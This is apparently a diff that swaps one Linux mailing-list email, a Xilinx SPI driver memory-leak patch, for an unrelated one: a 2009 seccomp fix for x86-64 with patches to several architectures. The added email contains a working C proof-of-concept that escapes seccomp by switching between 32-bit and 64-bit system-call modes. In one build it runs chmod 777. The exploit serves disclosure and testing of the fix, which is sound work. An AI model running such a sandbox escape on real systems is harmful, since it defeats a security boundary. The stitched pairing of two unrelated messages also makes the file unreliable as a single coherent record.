@@ -1,17 +1,24 @@
-Return-Path: <John.Linn@xilinx.com>
-Received: from WA4EHSOBE002.bigfish.com (wa4ehsobe002.messaging.microsoft.com
-	[216.32.181.12]) by ozlabs.org (Postfix) with ESMTP id 764E6DDD01
-	for <linuxppc-dev@ozlabs.org>; Sat, 28 Feb 2009 11:10:06 +1100 (EST)
-From: John Linn <john.linn@xilinx.com>
-To: grant.likely@secretlab.ca, linuxppc-dev@ozlabs.org,
-	jwboyer@linux.vnet.ibm.com, akonovalov@ru.mvista.com,
-	dbrownell@users.sourceforge.net
-Subject: [PATCH] Xilinx: SPI: driver not releasing memory
-Date: Fri, 27 Feb 2009 16:54:45 -0700
-Message-ID: <20090227235456.4DED2448057@mail135-wa4.bigfish.com>
+Return-Path: <roland@redhat.com>
+Received: from mx1.redhat.com (mx1.redhat.com [66.187.233.31])
+	by ozlabs.org (Postfix) with ESMTP id 6A06ADDDA1
+	for <linuxppc-dev@ozlabs.org>; Sat, 28 Feb 2009 18:26:54 +1100 (EST)
 MIME-Version: 1.0
-Content-Type: text/plain
-Cc: John Linn <john.linn@xilinx.com>
+Content-Type: text/plain; charset=us-ascii
+From: Roland McGrath <roland@redhat.com>
+To: Linus Torvalds <torvalds@linux-foundation.org>
+Subject: Re: [PATCH 2/2] x86-64: seccomp: fix 32/64 syscall hole
+In-Reply-To: Linus Torvalds's message of  Friday,
+	27 February 2009 19:52:09 -0800
+	<alpine.LFD.2.00.0902271948570.3111@localhost.localdomain>
+References: <20090228030226.C0D34FC3DA@magilla.sf.frob.com>
+	<20090228030413.5B915FC3DA@magilla.sf.frob.com>
+	<alpine.LFD.2.00.0902271932520.3111@localhost.localdomain>
+	<alpine.LFD.2.00.0902271948570.3111@localhost.localdomain>
+Message-Id: <20090228072554.CFEA6FC3DA@magilla.sf.frob.com>
+Date: Fri, 27 Feb 2009 23:25:54 -0800 (PST)
+Cc: linux-mips@linux-mips.org, x86@kernel.org, linux-kernel@vger.kernel.org,
+	linuxppc-dev@ozlabs.org, sparclinux@vger.kernel.org,
+	Andrew Morton <akpm@linux-foundation.org>, stable@kernel.org
 List-Id: Linux on PowerPC Developers Mail List <linuxppc-dev.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/options/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=unsubscribe>
@@ -21,69 +28,243 @@ List-Help: <mailto:linuxppc-dev-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=subscribe>
 
-The driver was not releasing memory when it was removed or
-when there was a failure during probe. This fixes it.
+> Ok, I can see what's going on. And it's disgusting.
 
-Signed-off-by: John Linn <john.linn@xilinx.com>
+That's what I thought when I saw TIF_32BIT in seccomp.
+
+I did the simplest fix I could see touching only x86.
+
+I don't know any other arch well enough to be sure that TIF_32BIT isn't the
+wrong test there too.  I'd like to leave that worry to the arch maintainers.
+
+But here is the patch you asked for.
+
+Thanks,
+Roland
 
 ---
-This is an incremental patch to the patch (updated driver
-for device tree) that is in the next branch.
+[PATCH] x86-64: seccomp: fix 32/64 syscall hole
+
+On x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with
+ljmp, and then use the "syscall" instruction to make a 64-bit system
+call.  A 64-bit process make a 32-bit system call with int $0x80.
+
+In both these cases under CONFIG_SECCOMP=y, secure_computing() will use
+the wrong system call number table.  The fix is simple: test TS_COMPAT
+instead of TIF_IA32.  Here is an example exploit:
+
+	/* test case for seccomp circumvention on x86-64
+
+	   There are two failure modes: compile with -m64 or compile with -m32.
+
+	   The -m64 case is the worst one, because it does "chmod 777 ." (could
+	   be any chmod call).  The -m32 case demonstrates it was able to do
+	   stat(), which can glean information but not harm anything directly.
+
+	   A buggy kernel will let the test do something, print, and exit 1; a
+	   fixed kernel will make it exit with SIGKILL before it does anything.
+	*/
+
+	#define _GNU_SOURCE
+	#include <assert.h>
+	#include <inttypes.h>
+	#include <stdio.h>
+	#include <linux/prctl.h>
+	#include <sys/stat.h>
+	#include <unistd.h>
+	#include <asm/unistd.h>
+
+	int
+	main (int argc, char **argv)
+	{
+	  char buf[100];
+	  static const char dot[] = ".";
+	  long ret;
+	  unsigned st[24];
+
+	  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)
+	    perror ("prctl(PR_SET_SECCOMP) -- not compiled into kernel?");
+
+	#ifdef __x86_64__
+	  assert ((uintptr_t) dot < (1UL << 32));
+	  asm ("int $0x80 # %0 <- %1(%2 %3)"
+	       : "=a" (ret) : "0" (15), "b" (dot), "c" (0777));
+	  ret = snprintf (buf, sizeof buf,
+			  "result %ld (check mode on .!)\n", ret);
+	#elif defined __i386__
+	  asm (".code32\n"
+	       "pushl %%cs\n"
+	       "pushl $2f\n"
+	       "ljmpl $0x33, $1f\n"
+	       ".code64\n"
+	       "1: syscall # %0 <- %1(%2 %3)\n"
+	       "lretl\n"
+	       ".code32\n"
+	       "2:"
+	       : "=a" (ret) : "0" (4), "D" (dot), "S" (&st));
+	  if (ret == 0)
+	    ret = snprintf (buf, sizeof buf,
+			    "stat . -> st_uid=%u\n", st[7]);
+	  else
+	    ret = snprintf (buf, sizeof buf, "result %ld\n", ret);
+	#else
+	# error "not this one"
+	#endif
+
+	  write (1, buf, ret);
+
+	  syscall (__NR_exit, 1);
+	  return 2;
+	}
+
+Signed-off-by: Roland McGrath <roland@redhat.com>
 ---
- drivers/spi/xilinx_spi.c |    9 +++++++--
- 1 files changed, 7 insertions(+), 2 deletions(-)
+ arch/mips/include/asm/seccomp.h    |    1 -
+ arch/powerpc/include/asm/compat.h  |    5 +++++
+ arch/powerpc/include/asm/seccomp.h |    4 ----
+ arch/sparc/include/asm/compat.h    |    5 +++++
+ arch/sparc/include/asm/seccomp.h   |    6 ------
+ arch/x86/include/asm/seccomp_32.h  |    6 ------
+ arch/x86/include/asm/seccomp_64.h  |    8 --------
+ kernel/seccomp.c                   |    7 ++++---
+ 8 files changed, 14 insertions(+), 28 deletions(-)
 
-diff --git a/drivers/spi/xilinx_spi.c b/drivers/spi/xilinx_spi.c
-index fe7e5f3..494d3f7 100644
---- a/drivers/spi/xilinx_spi.c
-+++ b/drivers/spi/xilinx_spi.c
-@@ -354,7 +354,7 @@ static int __init xilinx_spi_of_probe(struct of_device *ofdev,
- 	if (xspi->regs == NULL) {
- 		rc = -ENOMEM;
- 		dev_warn(&ofdev->dev, "ioremap failure\n");
--		goto put_master;
-+		goto release_mem;
- 	}
- 	xspi->irq = r_irq->start;
+diff --git a/arch/mips/include/asm/seccomp.h b/arch/mips/include/asm/seccomp.h
+index 36ed440..a6772e9 100644
+--- a/arch/mips/include/asm/seccomp.h
++++ b/arch/mips/include/asm/seccomp.h
+@@ -1,6 +1,5 @@
+ #ifndef __ASM_SECCOMP_H
  
-@@ -365,7 +365,7 @@ static int __init xilinx_spi_of_probe(struct of_device *ofdev,
- 	prop = of_get_property(ofdev->node, "xlnx,num-ss-bits", &len);
- 	if (!prop || len < sizeof(*prop)) {
- 		dev_warn(&ofdev->dev, "no 'xlnx,num-ss-bits' property\n");
--		goto put_master;
-+		goto unmap_io;
- 	}
- 	master->num_chipselect = *prop;
+-#include <linux/thread_info.h>
+ #include <linux/unistd.h>
  
-@@ -397,6 +397,8 @@ free_irq:
- 	free_irq(xspi->irq, xspi);
- unmap_io:
- 	iounmap(xspi->regs);
-+release_mem:
-+	release_mem_region(r_mem->start, resource_size(r_mem));
- put_master:
- 	spi_master_put(master);
- 	return rc;
-@@ -406,6 +408,7 @@ static int __devexit xilinx_spi_remove(struct of_device *ofdev)
- {
- 	struct xilinx_spi *xspi;
- 	struct spi_master *master;
-+	struct resource r_mem;
+ #define __NR_seccomp_read __NR_read
+diff --git a/arch/powerpc/include/asm/compat.h b/arch/powerpc/include/asm/compat.h
+index d811a8c..4774c2f 100644
+--- a/arch/powerpc/include/asm/compat.h
++++ b/arch/powerpc/include/asm/compat.h
+@@ -210,5 +210,10 @@ struct compat_shmid64_ds {
+ 	compat_ulong_t __unused6;
+ };
  
- 	master = platform_get_drvdata(ofdev);
- 	xspi = spi_master_get_devdata(master);
-@@ -413,6 +416,8 @@ static int __devexit xilinx_spi_remove(struct of_device *ofdev)
- 	spi_bitbang_stop(&xspi->bitbang);
- 	free_irq(xspi->irq, xspi);
- 	iounmap(xspi->regs);
-+	if (!of_address_to_resource(ofdev->node, 0, &r_mem))
-+		release_mem_region(r_mem.start, resource_size(&r_mem));
- 	dev_set_drvdata(&ofdev->dev, 0);
- 	spi_master_put(xspi->bitbang.master);
++static inline int is_compat_task(void)
++{
++	return test_thread_flag(TIF_32BIT);
++}
++
+ #endif /* __KERNEL__ */
+ #endif /* _ASM_POWERPC_COMPAT_H */
+diff --git a/arch/powerpc/include/asm/seccomp.h b/arch/powerpc/include/asm/seccomp.h
+index 853765e..00c1d91 100644
+--- a/arch/powerpc/include/asm/seccomp.h
++++ b/arch/powerpc/include/asm/seccomp.h
+@@ -1,10 +1,6 @@
+ #ifndef _ASM_POWERPC_SECCOMP_H
+ #define _ASM_POWERPC_SECCOMP_H
  
--- 
-1.5.3.4
-
-
-
-This email and any attachments are intended for the sole use of the named recipient(s) and contain(s) confidential information that may be proprietary, privileged or copyrighted under applicable law. If you are not the intended recipient, do not read, copy, or forward this email message or any attachments. Delete this email message and any attachments immediately.
+-#ifdef __KERNEL__
+-#include <linux/thread_info.h>
+-#endif
+-
+ #include <linux/unistd.h>
+ 
+ #define __NR_seccomp_read __NR_read
+diff --git a/arch/sparc/include/asm/compat.h b/arch/sparc/include/asm/compat.h
+index f260b58..0e70625 100644
+--- a/arch/sparc/include/asm/compat.h
++++ b/arch/sparc/include/asm/compat.h
+@@ -240,4 +240,9 @@ struct compat_shmid64_ds {
+ 	unsigned int	__unused2;
+ };
+ 
++static inline int is_compat_task(void)
++{
++	return test_thread_flag(TIF_32BIT);
++}
++
+ #endif /* _ASM_SPARC64_COMPAT_H */
+diff --git a/arch/sparc/include/asm/seccomp.h b/arch/sparc/include/asm/seccomp.h
+index 7fcd996..adca1bc 100644
+--- a/arch/sparc/include/asm/seccomp.h
++++ b/arch/sparc/include/asm/seccomp.h
+@@ -1,11 +1,5 @@
+ #ifndef _ASM_SECCOMP_H
+ 
+-#include <linux/thread_info.h> /* already defines TIF_32BIT */
+-
+-#ifndef TIF_32BIT
+-#error "unexpected TIF_32BIT on sparc64"
+-#endif
+-
+ #include <linux/unistd.h>
+ 
+ #define __NR_seccomp_read __NR_read
+diff --git a/arch/x86/include/asm/seccomp_32.h b/arch/x86/include/asm/seccomp_32.h
+index a6ad87b..b811d6f 100644
+--- a/arch/x86/include/asm/seccomp_32.h
++++ b/arch/x86/include/asm/seccomp_32.h
+@@ -1,12 +1,6 @@
+ #ifndef _ASM_X86_SECCOMP_32_H
+ #define _ASM_X86_SECCOMP_32_H
+ 
+-#include <linux/thread_info.h>
+-
+-#ifdef TIF_32BIT
+-#error "unexpected TIF_32BIT on i386"
+-#endif
+-
+ #include <linux/unistd.h>
+ 
+ #define __NR_seccomp_read __NR_read
+diff --git a/arch/x86/include/asm/seccomp_64.h b/arch/x86/include/asm/seccomp_64.h
+index 4171bb7..84ec1bd 100644
+--- a/arch/x86/include/asm/seccomp_64.h
++++ b/arch/x86/include/asm/seccomp_64.h
+@@ -1,14 +1,6 @@
+ #ifndef _ASM_X86_SECCOMP_64_H
+ #define _ASM_X86_SECCOMP_64_H
+ 
+-#include <linux/thread_info.h>
+-
+-#ifdef TIF_32BIT
+-#error "unexpected TIF_32BIT on x86_64"
+-#else
+-#define TIF_32BIT TIF_IA32
+-#endif
+-
+ #include <linux/unistd.h>
+ #include <asm/ia32_unistd.h>
+ 
+diff --git a/kernel/seccomp.c b/kernel/seccomp.c
+index ad64fcb..57d4b13 100644
+--- a/kernel/seccomp.c
++++ b/kernel/seccomp.c
+@@ -8,6 +8,7 @@
+ 
+ #include <linux/seccomp.h>
+ #include <linux/sched.h>
++#include <linux/compat.h>
+ 
+ /* #define SECCOMP_DEBUG 1 */
+ #define NR_SECCOMP_MODES 1
+@@ -22,7 +23,7 @@ static int mode1_syscalls[] = {
+ 	0, /* null terminated */
+ };
+ 
+-#ifdef TIF_32BIT
++#ifdef CONFIG_COMPAT
+ static int mode1_syscalls_32[] = {
+ 	__NR_seccomp_read_32, __NR_seccomp_write_32, __NR_seccomp_exit_32, __NR_seccomp_sigreturn_32,
+ 	0, /* null terminated */
+@@ -37,8 +38,8 @@ void __secure_computing(int this_syscall)
+ 	switch (mode) {
+ 	case 1:
+ 		syscall = mode1_syscalls;
+-#ifdef TIF_32BIT
+-		if (test_thread_flag(TIF_32BIT))
++#ifdef CONFIG_COMPAT
++		if (is_compat_task())
+ 			syscall = mode1_syscalls_32;
+ #endif
+ 		do {
